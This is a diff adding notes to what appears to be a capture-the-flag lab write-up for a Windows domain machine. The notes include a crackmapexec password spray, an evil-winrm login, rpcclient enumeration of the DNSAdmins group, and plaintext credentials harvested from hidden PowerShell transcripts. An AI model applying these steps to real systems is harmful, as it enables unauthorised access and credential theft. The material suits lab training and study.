@@ -39,3 +39,17 @@ cme smb 10.10.10.169 -u users.txt -p 'Welcome123!'
 >
 SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
 
+Used evil-winrm to get user flag as Melanie. On her Desktop.
+
+audits of device show DNSAdmins group Contractors. (enumdomgroups) 
+
+querygroup 0x44f
+querygroupmem 0x44f -> shows members of group
+member 0x451 revealed
+enumdomusers shows 0x451 as 'ryan'
+
+log directory found at C:\PSTranscripts using 'dir -Force' on C:\
+gci -hidden also works
+
+in PSTranscripts found PS history giving creds
+ryan:Serv3r4Admin4cc123!
